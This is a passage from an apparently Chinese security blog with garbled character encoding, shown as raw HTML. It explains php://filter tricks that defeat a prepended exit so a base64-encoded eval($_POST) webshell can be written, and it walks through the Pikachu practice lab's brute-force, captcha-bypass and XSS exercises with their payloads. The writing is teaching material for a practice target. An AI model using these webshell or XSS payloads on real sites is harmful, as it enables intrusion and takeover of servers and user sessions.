class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>



<h4 id="php-filterç»•è¿‡æ­»äº¡ä»£ç "><a href="#php-filterç»•è¿‡æ­»äº¡ä»£ç " class="headerlink" title="php://filterç»•è¿‡æ­»äº¡ä»£ç "></a>php://filterç»•è¿‡æ­»äº¡ä»£ç </h4><p>ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p><code>$content</code>åœ¨å¼€å¤´å¢åŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†</p>
<h5 id="1ã€base64"><a href="#1ã€base64" class="headerlink" title="1ã€base64"></a>1ã€base64</h5><p>è¿™é‡Œçš„<code>$_POST[&#39;filename&#39;]</code>æ˜¯å¯ä»¥æ§åˆ¶åè®®çš„ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨ php://filteråè®®æ¥æ–½å±•é­”æ³•ï¼šä½¿ç”¨php://filteræµçš„base64-decodeæ–¹æ³•ï¼Œå°†<code>$content</code>è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§å»é™¤â€œæ­»äº¡exitâ€ã€‚base64ç¼–ç åªåŒ…å«äº†64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚æ‰€æœ‰å°±å¯ä»¥ç†è§£ä¸ºï¼Œåœ¨phpä¸­å¯¹base64è§£ç å…ˆåŒ¹é…æ‰€æœ‰ç¬¦åˆbase64ç¼–ç è§„èŒƒçš„å­—ç¬¦åœ¨å¯¹å…¶è¿›è¡Œè§£ç ã€‚æ‰€ä»¥ï¼Œå½“<code>$content</code>è¢«åŠ ä¸Šäº†<code>&lt;?php exit; ?&gt;</code>ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚â€œphpexitâ€ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 1ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œâ€phpexitaâ€è¢«æ­£å¸¸è§£ç ï¼Œè€Œåé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æœå°±æ˜¯<code>&lt;?php exit; ?&gt;</code>æ²¡æœ‰äº†</p>
<p>ä¼ å…¥çš„<code>payload:txt==aPD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=</code> <code>filename=php://filter/write=convet.base64-decode/resource=shell.php</code></p>
<h5 id="2ã€strip-tags"><a href="#2ã€strip-tags" class="headerlink" title="2ã€strip_tags"></a>2ã€strip_tags</h5><p>é™¤äº†ä½¿ç”¨base64ç‰¹æ€§çš„æ–¹æ³•å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨php://filterå­—ç¬¦ä¸²å¤„ç†æ–¹æ³•æ¥å»é™¤â€œæ­»äº¡exitâ€ã€‚</p>
<p>è¿™ä¸ª<code>&lt;?php exit; ?&gt;</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°å»é™¤å®ƒï¼Œè€Œphp://filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚</p>
<p><strong>strip_tags</strong></p>
<ol>
<li>(PHP 4, PHP 5, PHP 7, PHP 8)</li>
<li>strip_tags â€” ä»å­—ç¬¦ä¸²ä¸­å»é™¤ HTML å’Œ PHP æ ‡è®°</li>
</ol>
<p>php://filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†webshellç”¨base64ç¼–ç ã€‚åœ¨è°ƒç”¨å®Œæˆstrip_tagsåå†è¿›è¡Œbase64-decodeã€‚â€œæ­»äº¡exitâ€åœ¨ç¬¬ä¸€æ­¥è¢«å»é™¤ï¼Œè€Œwebshellåœ¨ç¬¬äºŒæ­¥è¢«è¿˜åŸ</p>
<p><code>payload:txt=PD9waHAgZXZhbCgkX1BPU1RbJ3gnXSk7Pz4=</code> <code>filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</code></p>
<h5 id="3ã€rot13"><a href="#3ã€rot13" class="headerlink" title="3ã€rot13"></a>3ã€rot13</h5><p>è¿˜å¯ä»¥åˆ©ç”¨rot13ç¼–ç ç‹¬ç«‹å®Œæˆä»»åŠ¡ã€‚åŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€œæ­»äº¡exitâ€å»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œåœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†</p>
<p><code>payload:txt=&lt;?cuc rkvg; ?&gt;</code> <code>filename=php://filter/write=string.rot13/resource=shell.php</code></p>
<p>å½“ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•çš„æ¡ä»¶å°±æ˜¯ä¸å¼€å¯çŸ­æ ‡ç­¾</p>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<p><a href="https://www.freebuf.com/news/182280.html">https://www.freebuf.com/news/182280.html</a></p>
<p><a href="http://www.y2hlbg.top/2021/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#post-comment">http://www.y2hlbg.top/2021/04/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/#post-comment</a></p>
<p><a href="https://www.cnblogs.com/my1e3/p/5854897.html">https://www.cnblogs.com/my1e3/p/5854897.html</a></p>
<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
]]></content>
      <categories>
        <category>webæ¼æ´</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>Pikachué¶åœºæ¼æ´å¤ç°è®°å½•</title>
    <url>/2021/05/18/pikachu/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h1 id="æš´åŠ›ç ´è§£"><a href="#æš´åŠ›ç ´è§£" class="headerlink" title="æš´åŠ›ç ´è§£"></a>æš´åŠ›ç ´è§£</h1><h2 id="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"><a href="#åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£" class="headerlink" title="åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£"></a>åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</h2><p><img src="https://img.vim-cn.com/85/6ce77643b8f836338a671fc2d48cfc8af9e0bb.png"></p>
<p>bpæŠ“åŒ…ï¼Œå‘é€åˆ° Intruderæ¨¡å—ï¼ˆå¿«æ·é”®ctrl+i</p>
<p><img src="https://img.vim-cn.com/c2/f54ad79a6cac76cc51be54a00efa92becd6330.png" alt="1"></p>
<p><img src="https://img.vim-cn.com/45/5c65c441cf3a0d43e4b0ec9c2b2e2700940053.png" alt="2"></p>
<p><img src="https://img.vim-cn.com/1b/9b560a9e5d0b9ec16a2a6d02a11a804eb111e7.png" alt="3"></p>
<p>ä¹‹åç‚¹å‡»å³ä¸Šè§’ start attackï¼ˆå¼€å§‹çˆ†ç ´</p>
<p><img src="https://img.vim-cn.com/8c/ca0eff454fbaa4d9dfb4500a4fe694c4a23529.png" alt="4"></p>
<h2 id="éªŒè¯ç ç»•è¿‡"><a href="#éªŒè¯ç ç»•è¿‡" class="headerlink" title="éªŒè¯ç ç»•è¿‡"></a>éªŒè¯ç ç»•è¿‡</h2><p>éªŒè¯ç çš„éªŒè¯æµç¨‹ä¸€èˆ¬ä¸ºï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯ç™»é™†é¡µé¢ï¼Œåå°ç”ŸæˆéªŒè¯ç ï¼šåå°ä½¿ç”¨ç®—æ³•ç”Ÿæˆå›¾ç‰‡ï¼Œå¹¶å°†å›¾ç‰‡è¿”å›åˆ°å®¢æˆ·ç«¯ï¼›åŒæ—¶å°†ç®—æ³•ç”Ÿæˆçš„å€¼å…¨å±€èµ‹å€¼å­˜åˆ°SESSIONä¸­ã€‚</li>
<li>æ ¡éªŒéªŒè¯ç ï¼šå®¢æˆ·ç«¯å°†è®¤è¯ä¿¡æ¯å’ŒéªŒè¯ç ä¸€åŒæäº¤ï¼›åå°å¯¹æäº¤çš„éªŒè¯ç ä¸SESSIONä¸­çš„è¿›è¡Œæ¯”è¾ƒï¼›</li>
<li>å®¢æˆ·ç«¯é‡æ–°åˆ·æ–°é¡µé¢ï¼Œå†æ¬¡ç”Ÿæˆæ–°çš„éªŒè¯ç ï¼šéªŒè¯ç ç®—æ³•ä¸­ä¸€èˆ¬åŒ…å«éšæœºå‡½æ•°ï¼Œæ‰€ä»¥æ¯æ¬¡åˆ·æ–°éƒ½ä¼šæ”¹å˜ã€‚</li>
</ol>
<p>åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£çš„æ–¹æ³•ï¼š</p>
<p>è´¦å·å¯†ç éšä¾¿è¾“ï¼Œæ¯”è¾ƒæ˜¯å¦è¾“å…¥éªŒè¯ç ä¸¤ç§æƒ…å†µç³»ç»Ÿçš„æç¤ºã€‚</p>
<p>å½“æˆ‘ä»¬ä¸è¾“å…¥éªŒè¯ç æ—¶ï¼Œä¼šæé†’æˆ‘ä»¬è¾“å…¥éªŒè¯ç ï¼›</p>
<p>å½“è¾“å…¥é”™è¯¯çš„éªŒè¯ç æ—¶ï¼Œä¼šæé†’éªŒè¯ç é”™è¯¯ã€‚æ¥ä¸‹æ¥è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œæç¤ºç”¨æˆ·åæˆ–è€…å¯†ç ä¸å­˜åœ¨</p>
<h3 id="on-client"><a href="#on-client" class="headerlink" title="on client"></a>on client</h3><p>å¸¸è§é—®é¢˜ï¼š</p>
<ul>
<li>ä½¿ç”¨å‰ç«¯jsæ¥å®ç°éªŒè¯ç ã€‚</li>
<li>å°†éªŒè¯ç åœ¨cookieä¸­æ³„éœ²ï¼Œå®¹æ˜“è¢«è·å–ã€‚</li>
<li>å°†éªŒè¯ç åœ¨å‰ç«¯æºä»£ç ä¸­æ³„éœ²ï¼Œå®¹æ˜“è¢«è·å–ã€‚</li>
</ul>
<p><img src="https://img.vim-cn.com/3d/803d8b914ab679933e2b8d3a994db413aa5376.png"></p>
<p>æŠ“åŒ…å‘é€åˆ°Intruderæ¨¡å—ï¼Œåªå°†ç”¨æˆ·åå’Œå¯†ç è®¾ç½®ä¸ºå˜é‡ï¼ŒéªŒè¯ç ä¸ºæ­£ç¡®éªŒè¯ç ï¼Œå¼€å§‹çˆ†ç ´å³å¯</p>
<h3 id="on-server"><a href="#on-server" class="headerlink" title="on server"></a>on server</h3><p>å¸¸è§é—®é¢˜ï¼š</p>
<ul>
<li>éªŒè¯ç åœ¨åå°ä¸è¿‡æœŸï¼Œå¯¼è‡´é•¿æ—¶é—´å¯ä»¥è¢«ä½¿ç”¨**.**</li>
<li>éªŒè¯ç æ ¡éªŒä¸ä¸¥æ ¼ï¼Œé€»è¾‘å‡ºç°é—®é¢˜**.**</li>
<li>éªŒè¯ç è®¾è®¡çš„å¤ªè¿‡ç®€å•å’Œæœ‰è§„å¾‹ï¼Œå®¹æ˜“è¢«çŒœæµ‹**.**</li>
</ul>
<p><img src="https://img.vim-cn.com/6d/74697edb57355f3f95a65903924ebb9e560d2f.png"></p>
<p>ç¡®è®¤éªŒè¯ç çš„æœ‰æ•ˆæ€§ã€‚å½“ä¸è¾“å…¥éªŒè¯ç æˆ–è€…è¾“å…¥éªŒè¯ç é”™è¯¯æ—¶ï¼Œæç¤ºéªŒè¯ç ä¸èƒ½ä¸ºç©ºæˆ–éªŒè¯ç é”™è¯¯</p>
<p>æŠ“åŒ…å‘é€åˆ°repeateræ¨¡å—ä¸­ä¿®æ”¹éªŒè¯ç çš„å€¼ï¼Œåˆ¤æ–­åå°å¯¹éªŒè¯ç æ˜¯å¦éªŒè¯ï¼Œå‘ç°å­˜åœ¨éªŒè¯</p>
<p>ä½¿ç”¨æ­£ç¡®éªŒè¯ç ï¼Œè¿”å›ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œä¿®æ”¹ç”¨æˆ·åæˆ–å¯†ç çš„å€¼å†æ¬¡å‘é€ï¼Œå‘ç°ä»æç¤ºç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œå¾—åˆ°ç»“è®ºï¼ŒéªŒè¯ç å­˜åœ¨ä¸è¿‡æœŸçš„é—®é¢˜æ¥ä¸‹æ¥å°±ç›´æ¥å°†ç”¨æˆ·åå¯†ç è®¾ä¸ºå˜é‡çˆ†ç ´å°±å¯ä»¥äº†</p>
<h1 id="Cross-Site-Scripting-â€“-XSS"><a href="#Cross-Site-Scripting-â€“-XSS" class="headerlink" title="Cross-Site Scripting â€“ XSS"></a>Cross-Site Scripting â€“ XSS</h1><p>å±å®³ï¼šå­˜å‚¨å‹ &gt; åå°„å‹ &gt; DOMå‹</p>
<p>ç”¨æˆ·è®¿é—®å«æœ‰xssæ¼æ´çš„ç½‘ç«™ï¼Œè§¦å‘è„šæœ¬ï¼Œç½‘ç«™è¿”å›ç”¨æˆ·å¸¦æœ‰æ¶æ„ä»£ç çš„é¡µé¢ï¼Œæ‰§è¡Œè„šæœ¬ï¼Œå°†æ•°æ®è¿”å›ç»™æ”»å‡»è€…ï¼Œæ”»å‡»è€…å¯ç”¨ä¼ªé€ ç”¨æˆ·è¿›è¡Œä¸€äº›æ“ä½œ</p>
<p>åå°„å‹ï¼šä¸€æ¬¡æ€§</p>
<p>å­˜å‚¨å‹ï¼šæ¶æ„ä»£ç å­˜å‚¨åœ¨æ•°æ®åº“é‡Œè¾¹ï¼Œå¸¸è§äºç•™è¨€æ¿ï¼Œæ³¨å†Œé¡µé¢ç­‰ç­‰</p>
<p>DOMå‹ï¼šä¸ä¸åå°æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œé€šè¿‡DOMæ“ä½œå‰ç«¯ä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„é—®é¢˜ï¼Œä¸€æ¬¡æ€§ï¼Œç±»ä¼¼åå°„å‹</p>
<p>è¿›è¡Œæµ‹è¯•XSSæ¼æ´æ—¶ï¼Œå¯ä»¥å…ˆä¼ å…¥ä¸€äº›å­—ç¬¦æ¥åˆ¤æ–­æ˜¯å¦å¯¹è¾“å…¥æœ‰è¿‡æ»¤</p>
<h2 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="headerlink" title="åå°„å‹xss( get )"></a>åå°„å‹xss( get )</h2><p><img src="https://img.vim-cn.com/f4/4872bdf2a3aca7f0bfcd4df92c5ae27fc00f48.png"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å¯¹è¾“å…¥é•¿åº¦æœ‰é™åˆ¶ï¼Œä¿®æ”¹é•¿åº¦é™åˆ¶ï¼Œå†æ¬¡è¾“å…¥ï¼Œå³å¯è§¦å‘å¼¹çª—.</p>
<p><img src="https://img.vim-cn.com/5d/c54793f8b28a1d956094381770e11ffa1ebccb.png"></p>
<h2 id="åå°„å‹xss-post"><a href="#åå°„å‹xss-post" class="headerlink" title="åå°„å‹xss( post )"></a>åå°„å‹xss( post )</h2><p><img src="https://img.vim-cn.com/34/df3d0fe9d4b389dab6ca80989d1b1ed91e6e78.png"></p>
<p>ç”¨bpæŠ“åŒ…ï¼Œçˆ†ç ´ç”¨æˆ·åå’Œå¯†ç ï¼ˆä¹Ÿå¯ç‚¹å‡»å³ä¸Šè§’æç¤ºï¼‰ç™»é™†ä¹‹å</p>
<p>åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å¯è§¦å‘å¼¹çª—</p>
<h2 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h2><p><img src="https://img.vim-cn.com/c0/5287300170534ff4c119a872a8b485305fcae8.png"></p>
<p>payloadğŸ‘‡</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h2><p><img src="https://img.vim-cn.com/da/028a359d0666622deed8532129730b5b1c9c54.png"></p>
<p><img src="https://img.vim-cn.com/ff/9da34465c173f02d6012738a899ff77cc7a8f8.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;xssd_main&quot;</span>&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">var</span> str = document.getElementById(<span class="string">&quot;text&quot;</span>).value;</span><br><span class="line">         document.getElementById(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//è¯•è¯•ï¼š&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">      <span class="comment">//è¯•è¯•ï¼š&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</span></span><br><span class="line">   &lt;/script&gt;</span><br><span class="line">   &lt;!--&lt;a href=<span class="string">&quot;&quot;</span> onclick=(<span class="string">&#x27;xss&#x27;</span>)&gt;--&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;text&quot;</span> type=<span class="string">&quot;text&quot;</span>  value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">   &lt;input id=<span class="string">&quot;button&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;click me!&quot;</span> onclick=<span class="string">&quot;domxss()&quot;</span> /&gt;</span><br><span class="line">   &lt;div id=<span class="string">&quot;dom&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;        </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°åªéœ€è¦æŠŠ<code>&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;</code>é—­åˆäº†ï¼Œæ„é€ payloadğŸ‘‡</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //åªéœ€è¦ç‚¹å‡»å¯¹åº”çš„é“¾æ¥å³å¯è§¦å‘å¼¹çª—</span><br><span class="line"></span><br><span class="line">&quot;&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> //å°†é¼ æ ‡ç§»åˆ°å¯¹åº”ä½ç½®å³å¯è§¦å‘å¼¹çª—</span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;  //ç›´æ¥åœ¨aæ ‡ç­¾é‡Œæ·»åŠ onclickäº‹ä»¶</span><br></pre></td></tr></table></figure>

<h2 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h2><p><img src="https://img.vim-cn.com/e0/b1735fd25bd029c088bf046c3b5540bd6e7330.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;xssd_main&quot;&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      function domxss()&#123;</span><br><span class="line">         var str &#x3D; window.location.search;</span><br><span class="line">         var txss &#x3D; decodeURIComponent(str.split(&quot;text&#x3D;&quot;)[1]);</span><br><span class="line">         var xss &#x3D; txss.replace(&#x2F;\+&#x2F;g,&#39; &#39;);</span><br><span class="line">&#x2F;&#x2F;       alert(xss);</span><br><span class="line"></span><br><span class="line">         document.getElementById(&quot;dom&quot;).innerHTML &#x3D; &quot;&lt;a href&#x3D;&#39;&quot;+xss+&quot;&#39;&gt;å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F;è¯•è¯•ï¼š&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br><span class="line">      &#x2F;&#x2F;è¯•è¯•ï¼š&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;,é—­åˆæ‰å°±è¡Œ</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;!--&lt;a href&#x3D;&quot;&quot; onclick&#x3D;(&#39;xss&#39;)&gt;--&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;text&quot; name&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot;  value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;è¯·è¯´å‡ºä½ çš„ä¼¤å¿ƒå¾€äº‹&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;dom&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;       </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œä¸å‰è¾¹çš„åŸºæœ¬ä¸€æ ·ã€‚ã€‚æ²¡ä»€ä¹ˆè¿‡æ»¤ã€‚å¯ä»¥ç»§ç»­ä½¿ç”¨ä¸Šä¸€ä¸ªçš„payload</p>
<h2 id="XSSä¹‹ç›²æ‰“"><a href="#XSSä¹‹ç›²æ‰“" class="headerlink" title="XSSä¹‹ç›²æ‰“"></a>XSSä¹‹ç›²æ‰“</h2><p><img src="https://img.vim-cn.com/d7/516c1722d0ca48ceb34a328db75e26af5a9bf6.png"></p>
<p>ç°åœ¨ä¸¤ä¸ªæ¡†é‡Œéƒ½å°è¯•è¾“å…¥ä¸€äº›</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åç‚¹å‡»æäº¤ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿï¼Œè¿™æ—¶å€™æˆ‘ä»¬ç™»é™†åå°çœ‹çœ‹ï¼ˆå³ä¸Šè§’æœ‰æç¤º</p>
<p>ç”¨æˆ·åå¯†ç ä¸ä¹‹å‰çš„ä¸€æ ·</p>
<p>ç™»é™†ä¹‹åå¯çœ‹åˆ°å¼¹çª—</p>
<h2 id="XSSä¹‹è¿‡æ»¤"><a href="#XSSä¹‹è¿‡æ»¤" class="headerlink" title="XSSä¹‹è¿‡æ»¤"></a>XSSä¹‹è¿‡æ»¤</h2><p><img src="https://img.vim-cn.com/a1/e4a14a9d8da6bf71646fe2ec990d4f46bb2f8b.png"></p>
<p>è¾“å…¥<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>æµ‹è¯•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿”å›ï¼šåˆ«è¯´è¿™äº›&#39;&gt;&#39;çš„è¯,ä¸è¦æ€•,å°±æ˜¯å¹²!</span><br></pre></td></tr></table></figure>

<p>å°è¯•å¤§å°å†™ç»•è¿‡æ£€æµ‹<code>&lt;ScriPT&gt;alert(&#39;xss&#39;)&lt;/ScriPT&gt;</code></p>
<h2 id="XSSä¹‹htmlspecialchars"><a href="#XSSä¹‹htmlspecialchars" class="headerlink" title="XSSä¹‹htmlspecialchars"></a>XSSä¹‹htmlspecialchars</h2><p><img src="https://img.vim-cn.com/c1/db094c6ab94a2fd34ed92b5777a75bf7b01439.png"></p>
<p>å®¡æŸ¥å…ƒç´ å¯ä»¥å‘ç°ï¼Œè¿™æ˜¯å°†è¾“å…¥çš„å†…å®¹è½¬åˆ°äº†aæ ‡ç­¾é‡Œä½œä¸ºhrefçš„å€¼ğŸ‘‡</p>
<p><img src="https://img.vim-cn.com/06/f22454f2d5c7b98c81f4369d6d3377a82382aa.png"></p>
<p>è€Œä¸”è¿˜å¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»¤hrefçš„å€¼ä¸ºç©ºå¹¶ä¸”æ·»åŠ ä¸€ä¸ªonclickäº‹ä»¶ï¼ˆä¹Ÿå¯ä»¥æ˜¯onmouseoverç­‰ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#39; onclick&#x3D;&#39;alert(123)&#39;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åç‚¹å‡»ç”Ÿæˆçš„é“¾æ¥å³å¯è§¦å‘äº‹ä»¶å®ç°å¼¹çª—</p>
<h2 id="XSSä¹‹hrefè¾“å‡º"><a href="#XSSä¹‹hrefè¾“å‡º" class="headerlink" title="XSSä¹‹hrefè¾“å‡º"></a>XSSä¹‹hrefè¾“å‡º</h2><p><img src="https://img.vim-cn.com/82/a0bb2386276e9146153cb681dc97271ef9af8b.png"></p>
<p>æµ‹è¯•å‘ç°è¾“å…¥127.0.0.1æˆ–è€…è¾“å…¥å€¼ä¸ºç©ºçš„è¯ä¼šè¿”å›ä¸€ä¸ªé“¾æ¥</p>
<p><img src="https://img.vim-cn.com/ef/201163c6166686531846759a8db1905cae2fc8.png"></p>
